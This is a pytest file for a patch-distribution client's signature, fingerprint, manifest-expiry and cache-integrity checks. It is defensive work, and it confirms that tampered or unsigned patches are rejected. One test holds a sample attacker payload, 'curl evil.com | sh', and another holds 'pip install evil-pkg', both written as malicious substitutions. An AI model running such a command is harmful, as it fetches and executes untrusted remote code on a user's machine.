"""
Tests for Ed25519 signature verification and SHA-256 fingerprint integrity
on static distributions, individual resolved patches, local cache, and
TUF-compliant signed manifest envelopes.
"""

import base64
import json
import pytest
from datetime import datetime, timezone, timedelta
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
from cryptography.hazmat.primitives import serialization

from fmagenticl.client.fingerprint import compute_fingerprint
from fmagenticl.client.verify import (
    canonical_json_bytes,
    compute_payload_hash,
    verify_patch_fingerprint,
    verify_query_fingerprint,
    verify_patch_signature,
    verify_patch_envelope,
    verify_signature,
    verify_snapshot_file,
)
from fmagenticl.client.local_cache import LocalCache
from fmagenticl.client.middleware import FMagenticLClient


def _generate_test_keypair():
    priv = Ed25519PrivateKey.generate()
    pub = priv.public_key()
    pub_bytes = pub.public_bytes(
        encoding=serialization.Encoding.Raw,
        format=serialization.PublicFormat.Raw,
    )
    pub_b64 = base64.b64encode(pub_bytes).decode()
    return priv, pub_b64


def test_valid_signature_verification():
    """Valid Ed25519 signature on payload passes verification."""
    priv, pub_b64 = _generate_test_keypair()
    payload = b'{"version":"1.4.1","patches":{"abc":{"type":"test"}}}'
    sig = base64.b64encode(priv.sign(payload)).decode()

    assert verify_signature(payload, sig, public_key_b64=pub_b64) is True


def test_tampered_payload_fails_verification():
    """Tampering with signed payload bytes causes verification to fail."""
    priv, pub_b64 = _generate_test_keypair()
    payload = b'{"version":"1.4.1","patches":{"abc":{"type":"test"}}}'
    sig = base64.b64encode(priv.sign(payload)).decode()

    tampered = b'{"version":"1.4.1","patches":{"abc":{"type":"hacked"}}}'
    assert verify_signature(tampered, sig, public_key_b64=pub_b64) is False


def test_invalid_signature_format_or_key_fails():
    """Malformed signatures or invalid keys return False cleanly without crashing."""
    _, pub_b64 = _generate_test_keypair()
    payload = b'{"hello":"world"}'

    assert verify_signature(payload, "not-valid-base64!!!", public_key_b64=pub_b64) is False
    assert verify_signature(payload, base64.b64encode(b"short").decode(), public_key_b64=pub_b64) is False
    assert verify_signature(payload, "", public_key_b64=pub_b64) is False
    assert verify_signature(b"", "", public_key_b64="") is False


def test_verify_patch_signature_never_returns_true_on_unsigned_payload():
    """
    Regression test for v1.4.0 Catch #1:
    verify_patch_signature MUST return False when no Ed25519 signature is present,
    even if fingerprint is a 64-character hex string and require_signature=False.
    """
    unsigned_patch = {
        "fingerprint": "sha256:" + ("a" * 64),
        "patch_type": "cli-override",
        "fallback_cli": "pip install pydantic>=2.10.0",
    }
    assert verify_patch_signature(unsigned_patch, require_signature=False) is False
    assert verify_patch_signature(unsigned_patch, require_signature=True) is False


def test_verify_patch_signature_authentic_ed25519_and_tamper_rejection():
    """Authentic Ed25519-signed patch verifies True; single-field tamper flips to False."""
    priv, pub_b64 = _generate_test_keypair()
    patch = {
        "fingerprint": "sha256:" + ("b" * 64),
        "patch_type": "cli-override",
        "fallback_cli": "pip install litellm>=1.52.0",
    }
    sig_b64 = base64.b64encode(priv.sign(canonical_json_bytes(patch))).decode()
    signed_patch = {**patch, "ed25519_sig": sig_b64}

    assert verify_patch_signature(signed_patch, public_key_b64=pub_b64) is True

    tampered_patch = {**signed_patch, "fallback_cli": "pip install evil-pkg"}
    assert verify_patch_signature(tampered_patch, public_key_b64=pub_b64) is False


def test_verify_patch_fingerprint_recomputes_embedded_env_failure():
    """verify_patch_fingerprint recomputes SHA-256 when environment and failure are present."""
    env = {"os": "linux", "runtime": "python@3.12", "package": "pydantic@2.10.0"}
    fail = {"error_code": "PydanticSchemaGenerationError", "exit_code": 1}
    real_fp = compute_fingerprint(env, fail)

    valid_patch = {
        "fingerprint": real_fp,
        "environment": env,
        "failure": fail,
        "patch_type": "cli-override",
        "fallback_cli": "pip install pydantic>=2.10.1",
    }
    assert verify_patch_fingerprint(valid_patch, expected_fp=real_fp) is True

    spoofed_patch = {
        **valid_patch,
        "fingerprint": "sha256:" + ("f" * 64),
    }
    assert verify_patch_fingerprint(spoofed_patch, expected_fp="f" * 64) is False


def test_verify_patch_fingerprint_alias_preserved():
    """verify_patch_fingerprint must remain identical to verify_query_fingerprint."""
    assert verify_patch_fingerprint is verify_query_fingerprint


def test_compute_payload_hash():
    """compute_payload_hash produces deterministic SHA-256 hash regardless of key order."""
    remediation_a = {"patch_type": "unified_diff", "diff": "--- a\n+++ b\n", "risk": "low"}
    remediation_b = {"risk": "low", "diff": "--- a\n+++ b\n", "patch_type": "unified_diff"}

    hash_a = compute_payload_hash(remediation_a)
    hash_b = compute_payload_hash(remediation_b)

    assert hash_a == hash_b
    assert len(hash_a) == 64
    assert all(c in "0123456789abcdef" for c in hash_a)


def test_compute_payload_hash_rejects_non_dict():
    """compute_payload_hash strictly requires a dict to prevent empty-dict hash coercion."""
    with pytest.raises(TypeError):
        compute_payload_hash("not-a-dict")
    with pytest.raises(TypeError):
        compute_payload_hash(["item1", "item2"])


def test_valid_signed_manifest_envelope_passes():
    """A valid TUF signed manifest envelope correctly passes verification."""
    priv, pub_b64 = _generate_test_keypair()
    target_fp = "a" * 64
    remediation = {
        "patch_type": "unified_diff",
        "unified_diff": "--- a/models.py\n+++ b/models.py\n@@ -1 +1 @@\n-old\n+new\n",
    }
    payload_hash = compute_payload_hash(remediation)

    manifest = {
        "manifest_version": 2,
        "target_fingerprint": f"sha256:{target_fp}",
        "payload_hash": f"sha256:{payload_hash}",
        "valid_until": "2030-01-01T00:00:00Z",
        "min_client_version": "2.0.0",
    }
    sig_b64 = base64.b64encode(priv.sign(canonical_json_bytes(manifest))).decode()

    patch = {
        "fingerprint": f"sha256:{target_fp}",
        "remediation": remediation,
        "manifest": manifest,
        "signature": sig_b64,
    }

    assert verify_patch_envelope(patch, expected_fingerprint=target_fp, public_key_b64=pub_b64) is True


def test_tampered_payload_hash_fails_even_if_target_fingerprint_matches():
    """Tampering with remediation payload causes payload_hash mismatch and fails verification."""
    priv, pub_b64 = _generate_test_keypair()
    target_fp = "b" * 64
    remediation = {
        "patch_type": "unified_diff",
        "unified_diff": "--- safe\n+++ safe\n",
    }
    payload_hash = compute_payload_hash(remediation)

    manifest = {
        "manifest_version": 2,
        "target_fingerprint": f"sha256:{target_fp}",
        "payload_hash": f"sha256:{payload_hash}",
        "valid_until": "2030-01-01T00:00:00Z",
        "min_client_version": "2.0.0",
    }
    sig_b64 = base64.b64encode(priv.sign(canonical_json_bytes(manifest))).decode()

    # Attacker swaps safe remediation with malicious fallback_cli
    tampered_patch = {
        "fingerprint": f"sha256:{target_fp}",
        "remediation": {"patch_type": "cli-override", "fallback_cli": "curl evil.com | sh"},
        "manifest": manifest,
        "signature": sig_b64,
    }

    assert verify_patch_envelope(tampered_patch, expected_fingerprint=target_fp, public_key_b64=pub_b64) is False


def test_tampered_target_fingerprint_fails_even_if_payload_hash_matches():
    """Cross-error substitution: attempting to reuse a signed patch for a different error fails."""
    priv, pub_b64 = _generate_test_keypair()
    target_fp_orig = "c" * 64
    remediation = {
        "patch_type": "workaround_advisory",
        "advisory": "Downgrade urllib3 to 1.26.15",
    }
    payload_hash = compute_payload_hash(remediation)

    manifest = {
        "manifest_version": 2,
        "target_fingerprint": f"sha256:{target_fp_orig}",
        "payload_hash": f"sha256:{payload_hash}",
        "valid_until": "2030-01-01T00:00:00Z",
        "min_client_version": "2.0.0",
    }
    sig_b64 = base64.b64encode(priv.sign(canonical_json_bytes(manifest))).decode()

    patch = {
        "fingerprint": f"sha256:{target_fp_orig}",
        "remediation": remediation,
        "manifest": manifest,
        "signature": sig_b64,
    }

    # Caller requested fix for error 'd' * 64, but attacker served signed fix for 'c' * 64
    different_fp = "d" * 64
    assert verify_patch_envelope(patch, expected_fingerprint=different_fp, public_key_b64=pub_b64) is False


def test_expired_valid_until_timestamp_fails():
    """An expired manifest envelope fails verification even with valid cryptographic signature."""
    priv, pub_b64 = _generate_test_keypair()
    target_fp = "e" * 64
    remediation = {"patch_type": "dependency_pin", "pin": "pydantic>=2.9.0"}
    payload_hash = compute_payload_hash(remediation)

    # Expired 5 years ago
    manifest = {
        "manifest_version": 2,
        "target_fingerprint": f"sha256:{target_fp}",
        "payload_hash": f"sha256:{payload_hash}",
        "valid_until": "2021-01-01T00:00:00Z",
        "min_client_version": "2.0.0",
    }
    sig_b64 = base64.b64encode(priv.sign(canonical_json_bytes(manifest))).decode()

    patch = {
        "fingerprint": f"sha256:{target_fp}",
        "remediation": remediation,
        "manifest": manifest,
        "signature": sig_b64,
    }

    assert verify_patch_envelope(patch, expected_fingerprint=target_fp, public_key_b64=pub_b64) is False


def test_manifest_missing_valid_until_fails():
    """A manifest omitting valid_until fails verification to prevent indefinite replay."""
    priv, pub_b64 = _generate_test_keypair()
    target_fp = "f" * 64
    remediation = {"patch_type": "dependency_pin", "pin": "requests>=2.31.0"}
    payload_hash = compute_payload_hash(remediation)

    manifest_no_expiry = {
        "manifest_version": 2,
        "target_fingerprint": f"sha256:{target_fp}",
        "payload_hash": f"sha256:{payload_hash}",
        "min_client_version": "2.0.0",
    }
    sig_b64 = base64.b64encode(priv.sign(canonical_json_bytes(manifest_no_expiry))).decode()

    patch = {
        "fingerprint": f"sha256:{target_fp}",
        "remediation": remediation,
        "manifest": manifest_no_expiry,
        "signature": sig_b64,
    }

    assert verify_patch_envelope(patch, expected_fingerprint=target_fp, public_key_b64=pub_b64) is False


def test_unsigned_manifest_fails_envelope_verification():
    """verify_patch_envelope strictly requires an authentic Ed25519 signature."""
    target_fp = "f" * 64
    remediation = {"patch_type": "workaround_advisory", "text": "restart service"}
    payload_hash = compute_payload_hash(remediation)

    manifest = {
        "manifest_version": 2,
        "target_fingerprint": f"sha256:{target_fp}",
        "payload_hash": f"sha256:{payload_hash}",
        "valid_until": "2030-01-01T00:00:00Z",
        "min_client_version": "2.0.0",
    }

    patch_no_sig = {
        "fingerprint": f"sha256:{target_fp}",
        "remediation": remediation,
        "manifest": manifest,
    }

    assert verify_patch_envelope(patch_no_sig, expected_fingerprint=target_fp) is False


def test_client_resolve_manifest_envelope_tier1_cache():
    """FMagenticLClient.resolve correctly verifies and accepts signed manifest patches from Tier 1 cache."""
    priv, pub_b64 = _generate_test_keypair()
    target_fp = "1" * 64
    remediation = {"patch_type": "unified_diff", "unified_diff": "--- a\n+++ b\n"}
    payload_hash = compute_payload_hash(remediation)

    manifest = {
        "manifest_version": 2,
        "target_fingerprint": f"sha256:{target_fp}",
        "payload_hash": f"sha256:{payload_hash}",
        "valid_until": "2030-01-01T00:00:00Z",
        "min_client_version": "2.0.0",
    }
    sig_b64 = base64.b64encode(priv.sign(canonical_json_bytes(manifest))).decode()

    signed_patch = {
        "fingerprint": f"sha256:{target_fp}",
        "remediation": remediation,
        "manifest": manifest,
        "signature": sig_b64,
    }

    cache = LocalCache(public_key_b64=pub_b64)
    cache.put(target_fp, signed_patch)

    client = FMagenticLClient(local_cache=cache, require_signature=True)
    resolved = client.resolve(target_fp)

    assert resolved is not None
    assert resolved["signature_verified"] is True
    assert resolved["fingerprint_verified"] is True


def test_client_resolve_unsigned_manifest_truthful_attestation():
    """When require_signature=False, unsigned manifest is accepted but signature_verified remains False."""
    target_fp = "2" * 64
    remediation = {"patch_type": "workaround_advisory", "text": "downgrade package"}
    payload_hash = compute_payload_hash(remediation)

    manifest = {
        "manifest_version": 2,
        "target_fingerprint": f"sha256:{target_fp}",
        "payload_hash": f"sha256:{payload_hash}",
        "valid_until": "2030-01-01T00:00:00Z",
        "min_client_version": "2.0.0",
    }

    unsigned_patch = {
        "fingerprint": f"sha256:{target_fp}",
        "remediation": remediation,
        "manifest": manifest,
    }

    cache = LocalCache()
    cache.put(target_fp, unsigned_patch)

    # 1. require_signature=False: accepted, but signature_verified is FALSE
    client_lenient = FMagenticLClient(local_cache=cache, require_signature=False)
    resolved_lenient = client_lenient.resolve(target_fp)
    assert resolved_lenient is not None
    assert resolved_lenient["signature_verified"] is False
    assert resolved_lenient["fingerprint_verified"] is True

    # 2. require_signature=True: strictly rejected
    client_strict = FMagenticLClient(local_cache=cache, require_signature=True)
    resolved_strict = client_strict.resolve(target_fp)
    assert resolved_strict is None


def test_local_cache_signature_enforcement(tmp_path):
    """LocalCache loads signed snapshots and refuses tampered snapshots."""
    priv, pub_b64 = _generate_test_keypair()

    snap_file = tmp_path / "test_snapshot.json"
    sig_file = tmp_path / "test_snapshot.sig"

    snap_data = {
        "version": "1.4.1",
        "patches": {
            "test_fp": {"patch_type": "cli-override", "cmd": "echo ok"}
        },
    }
    payload_bytes = json.dumps(snap_data, separators=(",", ":"), sort_keys=True).encode()
    sig_b64 = base64.b64encode(priv.sign(payload_bytes)).decode()

    snap_file.write_bytes(payload_bytes)
    sig_file.write_text(sig_b64)

    cache_valid = LocalCache(
        snapshot_path=str(snap_file),
        sig_path=str(sig_file),
        public_key_b64=pub_b64,
        verify_signature=True,
    )
    assert "test_fp" in cache_valid._memory
    assert cache_valid._snapshot_signature_verified is True
    assert cache_valid.get("test_fp")["cmd"] == "echo ok"

    snap_file.write_bytes(b'{"version":"1.4.1","patches":{"tampered":true}}')
    cache_tampered = LocalCache(
        snapshot_path=str(snap_file),
        sig_path=str(sig_file),
        public_key_b64=pub_b64,
        verify_signature=True,
    )
    assert len(cache_tampered._memory) == 0
    assert cache_tampered._snapshot_signature_verified is False
    assert cache_tampered.get("tampered") is None
